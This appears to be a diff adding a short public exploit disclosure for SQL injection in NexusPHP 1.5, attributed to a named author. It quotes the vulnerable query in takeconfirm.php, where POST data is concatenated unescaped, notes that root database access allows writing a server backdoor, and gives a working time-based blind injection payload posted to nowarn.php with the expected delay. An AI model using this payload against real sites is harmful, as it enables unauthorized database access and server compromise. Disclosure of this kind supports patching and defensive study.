@@ -1,0 +1,21 @@
+# by 张宇航
+
+'''
+	In the default installation configuration, you need 'UC_MODERATOR' privileges can be implemented into the attack, when the database access permissions for root, you can use this vulnerability to write to the server backdoor file.
+
+	Source:
+		takeconfirm.php:9
+			sql_query("UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (" . implode(", ", $_POST[conusr]) . ") AND status='pending'");
+	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+	http://localhost/nowarn.php
+	
+	POST nowarned=nowarned&usernw[]=(select*from(select sleep(10))x)
+
+	The page will be delayed for 10 seconds
